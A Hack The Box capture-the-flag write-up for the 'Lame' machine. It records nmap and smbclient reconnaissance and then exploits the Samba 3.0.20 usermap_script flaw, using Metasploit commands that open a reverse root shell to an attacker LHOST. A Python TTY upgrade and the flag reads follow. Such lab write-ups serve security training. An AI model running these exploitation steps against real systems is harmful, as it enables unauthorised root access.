
# Hack The Box — Lame Writeup

##  Machine Info
- **Machine Name**: Lame
- **IP Address**: 10.129.6.93
- **Operating System**: Linux
- **Date Completed**: 2025-07-01
- **Tools Used**: nmap, smbclient, searchsploit, msfconsole, python

---

## 🔍 1. Reconnaissance

Started with a basic Nmap scan to identify open ports and service versions:

```bash
nmap -sC -sV -T4 -oN lame.nmap 10.129.6.93
````

### 🔎 Nmap Results:

| Port | Service | Version        |
| ---- | ------- | -------------- |
| 21   | FTP     | vsftpd 2.3.4   |
| 22   | SSH     | OpenSSH 4.7p1  |
| 139  | NetBIOS | Samba smbd 3.X |
| 445  | SMB     | Samba smbd 3.X |

---

## 2. Enumeration

I used `smbclient` to enumerate SMB shares and identify the Samba version:

```bash
smbclient -L //10.129.6.93 -N
```

Output:

```
Domain=[WORKGROUP] OS=[Unix] Server=[Samba 3.0.20]
```

Seeing that Samba version 3.0.20 was in use, I used `searchsploit` to look for known exploits:

```bash
searchsploit samba 3.0.20
```

Found:

```
Samba 3.0.20 - Remote Code Execution (user map script)
```

---

##  3. Exploitation

I used the Metasploit `usermap_script` exploit module to exploit the Samba RCE vulnerability and gain a shell:

```bash
msfconsole
use exploit/multi/samba/usermap_script
set RHOSTS 10.129.6.93
set LHOST 10.10.77.14
run
```

The exploit was successful and returned a **reverse shell as root**.

I then upgraded the shell using Python:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

> Root shell access confirmed using `whoami`.

---

## 4. Privilege Escalation

Not required. The Samba exploit provided a direct **root shell**, so privilege escalation was unnecessary.

---

## 🏁 5. Flags Captured

```bash
cat /root/root.txt
cat /home/makis/user.txt
```

 Root and user flags successfully retrieved.

---

## 🧰 Tools Summary

| Tool           | Purpose                    |
| -------------- | -------------------------- |
| `nmap`         | Port & version detection   |
| `smbclient`    | SMB enumeration            |
| `searchsploit` | Exploit discovery          |
| `msfconsole`   | Remote exploit (Samba RCE) |
| `python`       | TTY shell upgrade          |

